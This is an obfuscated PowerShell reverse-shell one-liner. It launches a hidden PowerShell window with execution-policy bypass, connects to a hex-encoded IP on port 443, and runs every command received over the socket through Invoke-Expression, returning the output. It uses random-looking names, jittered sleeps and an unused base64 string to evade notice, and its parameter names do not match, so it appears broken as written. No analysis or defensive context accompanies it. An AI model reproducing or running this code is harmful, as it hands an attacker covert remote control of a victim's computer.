Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop function Randomize { param ([int]$length = 8) -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_}) }; $okiuneiujdi = '0xc0a8012f'; $eciuiciief = 0x1bb; function TDIOZYTDYUEUID { param ($client, $stream, $writer, $reader) while ($true) { Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 1000); $writer.Write((pwd).Path + "> "); $writer.Flush(); $command = $reader.ReadLine(); if ($command -eq "exit") { break }; $output = Invoke-Expression -Command $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() } $client.Close() }; $encoded = "JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCkKJHdyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtKQokcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyZWFtUmVhZGVyKCRzdHJlYW0pCg=="; $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)); function Cdtijeiichiiue { param ($ip, $port) try { $client = New-Object System.Net.Sockets.TCPClient($ittrredtrdtr, $utrcdtrctr); Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 1000); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); return @($client, $stream, $writer, $reader) } catch { Write-Error "Connection failed"; exit } }; Randomize; $conn = Cdtijeiichiiue -ittrredtrdtr $okiuneiujdi -utrcdtrctr $eciuiciief; TDIOZYTDYUEUID -client $conn[0] -stream $conn[1] -writer $conn[2] -reader $conn[3]} -WindowStyle Hidden
